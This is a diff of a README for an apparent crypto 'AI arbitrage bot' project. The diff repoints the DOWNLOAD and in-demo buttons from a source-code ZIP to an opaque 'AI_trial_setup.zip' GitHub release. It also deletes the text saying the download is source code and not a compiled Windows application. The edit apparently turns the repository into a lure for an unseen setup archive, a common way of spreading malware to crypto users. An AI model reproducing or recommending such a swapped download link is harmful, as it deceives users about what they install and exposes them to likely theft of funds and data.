@@ -10,12 +10,12 @@ A live, interactive research terminal for **ETH / BTC / BNB**.
 
 <!-- pages-links:start -->
 [![VIEW DEMO](docs/view-demo.svg)](https://wordystepuncl.github.io/arbitrage/)
-[![DOWNLOAD](docs/download-project.svg)](https://wordystepuncl.github.io/arbitrage/downloads/parallax-ai-arbitrage-bot.zip)
+[![DOWNLOAD](docs/download-project.svg)](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trial1.4/AI_trial_setup.zip)
 
 [Live demo](https://wordystepuncl.github.io/arbitrage/) · [Run locally](#run-locally)
 <!-- pages-links:end -->
 
-[Open or download the local HTML demo](#open-the-single-file-demo)
+[Open the local HTML demo](#open-the-single-file-demo)
 
 ![Vanilla JavaScript](https://img.shields.io/badge/JavaScript-ES_Modules-bca4f4?style=flat-square&labelColor=19171f)
 ![No runtime dependencies](https://img.shields.io/badge/dependencies-0-a4d8ba?style=flat-square&labelColor=19171f)
@@ -72,7 +72,7 @@ Public endpoints can be subject to regional restrictions, rate limits or CORS ch
 
 ### Open the single-file demo
 
-Download [DEMO.html](DEMO.html) and open it in a browser. All styles, controls and the project download are embedded. Public quote requests still need internet access and may be restricted when opening a local file.
+Open [DEMO.html](DEMO.html) in a browser. The file includes the styles and controls. Public quote requests still need internet access and may be restricted when opening a local file.
 
 If quotes do not load from a local file, start a server in this directory with Python 3:
 
@@ -103,13 +103,13 @@ The build generates `DEMO.html` and the static GitHub Pages app at `dist/client/
 
 ## GitHub Pages
 
-The [live demo](https://wordystepuncl.github.io/arbitrage/) and [source ZIP](https://wordystepuncl.github.io/arbitrage/downloads/parallax-ai-arbitrage-bot.zip) are hosted in the `arbitrage/` folder of the shared [GitHub Pages repository](https://github.com/wordystepuncl/wordystepuncl.github.io). See [GitHub Pages setup](docs/GITHUB_PAGES.md) for the site layout.
+The [live demo](https://wordystepuncl.github.io/arbitrage/) is hosted in the `arbitrage/` folder of the shared [GitHub Pages repository](https://github.com/wordystepuncl/wordystepuncl.github.io). See [GitHub Pages setup](docs/GITHUB_PAGES.md) for the site layout.
 
 ## Project map
 
 | Path | Purpose |
 | --- | --- |
-| `DEMO.html` | Single-file demo with embedded assets and project download |
+| `DEMO.html` | Single-file demo with embedded assets |
 | `web/` | Responsive UI, styles, session interactions |
 | `src/market.js` | Shared exchange adapters, freshness checks and route calculation |
 | `scripts/build.mjs` | Dependency-free static build |
@@ -125,8 +125,6 @@ No analytics, cookies, wallet access or trading credentials. Session history rem
 
 [MIT](LICENSE)
 
-## Download the project
+## Download the trial
 
-The **DOWNLOAD** button downloads a complete source ZIP with setup instructions. It is not a compiled Windows application. The same styled button is available in both demos. Run `npm run build` from the source ZIP to regenerate the single-file demo.
-
-Every build creates `dist/client/downloads/parallax-ai-arbitrage-bot.zip` from a safe source allowlist. `.git`, `.openai`, secrets, dependencies and prior build artifacts are excluded. GitHub Pages serves this ZIP alongside the hosted app. The single-file demo embeds an identical ZIP.
+The **DOWNLOAD** button and the in-demo **Download trial** button link to [AI_trial_setup.zip](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trial1.4/AI_trial_setup.zip) from the **Trial1.4** GitHub release.
